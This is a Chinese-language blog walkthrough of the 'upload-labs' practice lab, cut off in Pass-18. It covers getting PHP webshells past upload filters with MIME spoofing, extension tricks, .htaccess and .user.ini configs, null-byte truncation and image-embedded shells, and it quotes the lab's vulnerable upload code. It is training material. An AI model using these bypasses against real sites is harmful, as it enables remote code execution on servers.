    <content type="html"><![CDATA[<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_01_1.png"></p><p>å‘ç°é¡µé¢å¹¶æ²¡æœ‰åˆ·æ–°ï¼Œåº”è¯¥æ˜¯å®¢æˆ·ç«¯æ£€æµ‹ï¼ˆæŸ¥çœ‹ç½‘é¡µæºç å°±èƒ½å‘ç°è¿™é‡Œæ˜¯å®¢æˆ·ç«¯æ£€æµ‹ï¼‰</p><p>ç¦ç”¨jsï¼Œå†æ¬¡ä¸Šä¼ ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_01_2.png"></p><p>ä¹Ÿå¯å°†æ–‡ä»¶åç¼€æ”¹ä¸ºjpgï¼Œç”¨bpæŠ“åŒ…åå°†æ–‡ä»¶åç¼€æ”¹å›php</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_02_1.png"></p><p>å‘ç°é¡µé¢æœ‰åˆ·æ–°ï¼Œåº”è¯¥æ˜¯æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæŸ¥çœ‹ç½‘é¡µæºç èƒ½å‘ç°å®¢æˆ·ç«¯å¹¶æ²¡æœ‰ç›¸å…³jsä»£ç è¿›è¡Œæ–‡ä»¶æ£€æµ‹ï¼‰</p><p>å°†æ–‡ä»¶åç¼€æ”¹ä¸ºjpgï¼Œå†æ¬¡ä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸï¼Œè¯´æ˜æœåŠ¡ç«¯è¿›è¡Œçš„æ˜¯ä¸€ä¸ªMIMEç±»å‹æ£€æµ‹ï¼ˆæˆ–åˆ™åç¼€æ£€æµ‹ï¼‰</p><p>bpæŠ“åŒ…å°†Content-Typeå­—æ®µä¿®æ”¹ä¸ºï¼štext&#x2F;htmlï¼Œåœ¨é‡æ”¾å™¨ä¸­æŸ¥çœ‹å“åº”</p><p><img src="/../images/upload-labs/pass_02_2.png"></p><p>ä¸Šä¼ å¤±è´¥ï¼Œç¡®å®šæ˜¯MIMEç±»å‹æ£€æµ‹ï¼Œå°†æ–‡ä»¶åç¼€æ”¹ä¸ºphpï¼ŒContent-Typeå­—æ®µæ”¹ä¸ºï¼šimage&#x2F;jpegï¼Œå†æ¬¡ä¸Šä¼ </p><p><img src="/../images/upload-labs/pass_02_3.png"></p><p>ä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_02_4.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_03_1.png"></p><p>æ˜¾ç„¶æ˜¯é»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹</p><p>å°è¯•äº†åç¼€åŒå†™ç»•è¿‡ã€.htaccessé…ç½®æ–‡ä»¶ç»•è¿‡ï¼Œ::$DATAç»•è¿‡ï¼Œå…¶ä»–å¯èƒ½è§£æç»•è¿‡å‡ä»¥å¤±è´¥å‘Šç»ˆ</p><p>çœ‹ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//æ”¶å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°è¯•çš„ç»•è¿‡æ–¹å¼æœªæˆåŠŸçš„åŸå› æ˜¯ï¼šå¯¹äºå­˜åœ¨äºé»‘åå•ä¸­çš„åç¼€åªåšæ£€æŸ¥è€Œä¸æ›¿æ¢ä¸ºç©ºï¼Œç»™ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ä¸€ä¸ªéšæœºæ–‡ä»¶åï¼Œå°†::$DATAæ›¿æ¢ä¸ºç©º</p><p>å¯ä»¥é€šè¿‡åŒå†™::$DATAè¿›è¡Œç»•è¿‡ï¼ˆ&amp; _ &amp;ï¼‰ï¼ŒæˆåŠŸä¸Šä¼ </p><p>å³é”®æ–°æ ‡ç­¾é¡µæ‰“å¼€å›¾åƒ</p><p><img src="/../images/upload-labs/pass_03_2.png"></p><p>å°†æœ«å°¾çš„::$DATAåˆ é™¤åå†è®¿é—®ï¼Œè®¿é—®æˆåŠŸï¼Œå°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_03_3.png"></p><p>å…¶ä»–å¯èƒ½è§£æç»•è¿‡å¤±è´¥çš„åŸå› æ˜¯Apacheçš„httpd-confé…ç½®æ–‡ä»¶ä¸­çš„â€œ#AddType application&#x2F;x-httpd-php .php .phtmlâ€è¢«æ³¨é‡Šï¼Œå°†å‰é¢çš„#å»æ‰ï¼Œå°±èƒ½å¤Ÿå°†.phtmläºphpè§£æå™¨å…³è”èµ·æ¥å³phtmlæ–‡ä»¶å¯ä»¥è¢«å½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æ</p><p>å°†æ³¨é‡Šç¬¦åˆ é™¤åï¼Œä¸Šä¼ phtmlæ–‡ä»¶ï¼Œå°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_03_4.png"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_04_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="/../images/upload-labs/pass_04_2.png"></p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œä¸”å‘ç°å¹¶æ²¡æœ‰ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶å</p><p>å°è¯•ä¸Šä¼ .htaccessé…ç½®æ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>å†ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸåï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_04_3.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_05_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œä¸”å‘ç°å¹¶æ²¡æœ‰ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶å</p><p>å°è¯•ä¸Šä¼ .htaccessé…ç½®æ–‡ä»¶ï¼Œä¸Šä¼ å¤±è´¥</p><p>å°è¯•è¿›è¡Œåç¼€åŒå†™ï¼Œ::$DATAåŠåŒå†™ï¼Œå…¶ä»–å¯èƒ½è§£æç»•è¿‡å‡å¤±è´¥</p><p>æŸ¥çœ‹æºç ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼ŒæŸ¥çœ‹æç¤º</p><p><img src="/../images/upload-labs/pass_05_2.png"></p><p>å¯ä»¥åˆ©ç”¨.user.iniå°†æ–‡ä»¶é©¬åŒ…å«åˆ°readme.phpä¸­</p><p>æˆ‘åœ¨è¿™ä½¿ç”¨çš„ç¯å¢ƒæ˜¯</p><p><img src="/../images/upload-labs/pass_05_4.png"></p><p>å…ˆä¸Šä¼ .user.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=test.jpg<br></code></pre></td></tr></table></figure><p>å†ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_05_3.png"></p><p>è¿™ä¸€ä¸ªpassè¿˜å¯ä»¥åˆ©ç”¨Apacheé™Œç”Ÿåç¼€è§£æç»•è¿‡</p><blockquote><p>Apacheé»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªæ‹“å±•åã€‚åˆ¤æ–­æ–‡ä»¶æ‹“å±•åçš„è§„åˆ™æ˜¯ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­ï¼Œå¦‚æœä¸ºä¸å¯è§£æçš„åç¼€åå°±ä¼šä»å·¦å¾€å³åˆ¤æ–­</p></blockquote><p>ä¸Šä¼ test.php.aaaï¼Œä¸Šä¼ æˆåŠŸï¼Œæ–°æ ‡ç­¾é¡µæ‰“å¼€å›¾åƒï¼Œå°†urlä¸­çš„aaaæ–‡ä»¶åç¼€å»é™¤åå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_05_5.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_06_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œä¸”å‘ç°ç»™äº†ä¸€ä¸ªéšæœºçš„æ–‡ä»¶åï¼Œä¸èƒ½åˆ©ç”¨é…ç½®æ–‡ä»¶ç»•è¿‡</p><p>å°è¯•å¤§å°å†™ç»•è¿‡ï¼Œä¸Šä¼ test.pHPï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_06_2.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_07_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œä¸”å‘ç°ç»™äº†ä¸€ä¸ªéšæœºçš„æ–‡ä»¶åï¼Œä¸èƒ½åˆ©ç”¨é…ç½®æ–‡ä»¶ç»•è¿‡</p><p>å°è¯•åŒå†™::$DATAï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_07_2.png"></p><p>çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°å¹¶æ²¡æœ‰è¿›è¡Œé¦–å°¾å»ç©ºçš„æ“ä½œï¼Œä¹Ÿå¯ä»¥åœ¨æ–‡ä»¶åç¼€ååŠ ç©ºæ ¼è¿›è¡Œç»•è¿‡</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_08_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œå‘ç°å¹¶æ²¡æœ‰ä¿®æ”¹æ–‡ä»¶åï¼Œå°è¯•åˆ©ç”¨é…ç½®æ–‡ä»¶ç»•è¿‡ï¼Œä¸Šä¼ å¤±è´¥</p><p>å°è¯•åˆ©ç”¨ç‚¹ç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_08_2.png"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_09_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œä¸”å‘ç°ç»™äº†ä¸€ä¸ªéšæœºçš„æ–‡ä»¶åï¼Œä¸èƒ½åˆ©ç”¨é…ç½®æ–‡ä»¶ç»•è¿‡</p><p>å°è¯•::$DATAç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_09_2.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_10_1.png"></p><p>å°è¯•ä¸Šä¼ test.jpgï¼Œä¸Šä¼ æˆåŠŸ</p><p>å°è¯•ä¸Šä¼ test.aaaï¼Œä¸Šä¼ æˆåŠŸ</p><p>åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªé»‘åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œå‘ç°å¹¶æ²¡æœ‰ä¿®æ”¹æ–‡ä»¶åï¼Œå°è¯•åˆ©ç”¨é…ç½®æ–‡ä»¶ç»•è¿‡ï¼Œä¸Šä¼ å¤±è´¥</p><p>å°è¯•ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_10_2.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œä¸Šä¼ æˆåŠŸï¼Œæ–°æ ‡ç­¾é¡µæ‰“å¼€å›¾åƒï¼Œå‘ç°phpè¢«æ›¿æ¢ä¸ºç©º</p><p><img src="/../images/upload-labs/pass_11_1.png"></p><p>phpåŒå†™ç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_11_2.png"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_12_1.png"></p><p>æ˜¾ç„¶æ˜¯ç™½åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼ŒbpæŠ“åŒ…å‘ç°ä»¥getçš„æ–¹å¼æäº¤äº†ä¸€ä¸ªsave_path</p><p>é‡‡ç”¨00æˆªæ–­ä¸­çš„%00æˆªæ–­</p><p><img src="/../images/upload-labs/pass_12_2.png"></p><p>ä¸Šä¼ æˆåŠŸå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_12_3.png"></p><p>00æˆªæ–­åˆ©ç”¨æ¡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>ï¼šphp&lt;<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">29</span>ä¸”magic_qutoes_gpc=<span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ç”¨çš„phpç‰ˆæœ¬æ˜¯</p><p><img src="/../images/upload-labs/pass_12_4.png"></p><p>magic_qutoes_gpcéœ€è¦åœ¨php.inié…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>å°è¯•ä¸Šä¼ test.phpï¼Œå¼¹å‡ºæç¤ºä¿¡æ¯</p><p><img src="/../images/upload-labs/pass_13_1.png"></p><p>æ˜¾ç„¶æ˜¯ç™½åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼ŒbpæŠ“åŒ…å‘ç°ä»¥postçš„æ–¹å¼æäº¤äº†ä¸€ä¸ªsave_path</p><p>é‡‡ç”¨00æˆªæ–­ä¸­çš„0x00æˆªæ–­</p><p><img src="/../images/upload-labs/pass_13_2.png"></p><p>æ”¾åŒ…åä¸Šä¼ æˆåŠŸï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_13_3.png"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>åˆ©ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œåœ¨å›¾ç‰‡æœ«å°¾æ’å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="/../images/upload-labs/pass_14_1.png"></p><p>ç„¶åä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸåï¼Œæ–°æ ‡ç­¾é¡µæ‰“å¼€å›¾åƒæ‹¿åˆ°æ–‡ä»¶è·¯å¾„</p><p>è¿›è¡Œæ–‡ä»¶åŒ…å«</p><p><img src="/../images/upload-labs/pass_14_2.png"></p><p>çœ‹ä¸€ä¸‹æºç ï¼Œåªæ£€æŸ¥æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œå¯ä»¥åˆ©ç”¨phpæ–‡ä»¶+å¤´å­—èŠ‚è¿›è¡Œç»•è¿‡</p><p>åˆ©ç”¨gifçš„æ–‡ä»¶å¹»æ•°å¯ä»¥ç›´æ¥åœ¨phpæ–‡ä»¶ä¸­åŠ å¦‚GIF89aï¼Œå¦‚æœè¦åˆ©ç”¨pngçš„æ–‡ä»¶å¹»æ•°å°±å°†ä¸€å¥è¯æœ¨é©¬å‰çš„åå…­è¿›åˆ¶å€¼æ”¹ä¸º8950</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>å¯ä»¥ç›´æ¥ç”¨pass14çš„æ–‡ä»¶é©¬</p><p><img src="/../images/upload-labs/pass_15_1.png"></p><p>çœ‹ä¸€ä¸‹æºç ï¼Œåˆ©ç”¨getimagesizeæ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡</p><blockquote><p>getimagesize() æ˜¯ PHP å†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–å›¾åƒæ–‡ä»¶çš„å°ºå¯¸ã€ç±»å‹å’Œ MIME ä¿¡æ¯</p></blockquote><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>éœ€è¦å¼€å¯php_exifæ¨¡å—</p><p><img src="/../images/upload-labs/pass_16_1.png"></p><blockquote><p>exif_imagetype() æ˜¯ PHP ä¸­ç”¨äºæ£€æµ‹å›¾åƒæ–‡ä»¶ç±»å‹çš„å†…ç½®å‡½æ•°ï¼Œä¸ getimagesize() ç±»ä¼¼ï¼Œä½†æ›´è½»é‡ã€‚å®ƒé€šè¿‡è¯»å–æ–‡ä»¶çš„å‰å‡ ä¸ªå­—èŠ‚ï¼ˆæ–‡ä»¶å¤´ï¼‰æ¥åˆ¤æ–­å›¾åƒç±»å‹</p></blockquote><p>å¯ä»¥ç›´æ¥ç”¨pass14çš„æ–‡ä»¶é©¬</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>å¯¹ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“</p><p>å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œä¸Šä¼ æˆåŠŸåå†å°†æ¸²æŸ“åçš„å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°</p><p>ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå¯»æ‰¾hexå€¼ä¸å˜çš„åœ°æ–¹ï¼Œ</p><p><img src="/../images/upload-labs/pass_17_1.png"></p><p>æ’å…¥ä¸€å¥è¯æœ¨é©¬åä¸Šä¼ ï¼Œä¸Šä¼ å¤±è´¥</p><p>æˆ‘ç”¨çš„æ˜¯gifç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„å¤„ç†æ–¹å¼ï¼Œä½†ä¸Šä¼ çš„æ˜¯jpgï¼Œpngä¸jpgç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„æ–¹å¼è¾ƒgifæ›´åŠ å¤æ‚(<a href="https://www.cnblogs.com/1ink/p/15115240.html">pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</a>)</p><p>æ‰¾äº†ä¸€ä¸ªç°æˆçš„gifæœ¨é©¬</p><p><img src="/../images/upload-labs/pass_17_2.png"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span 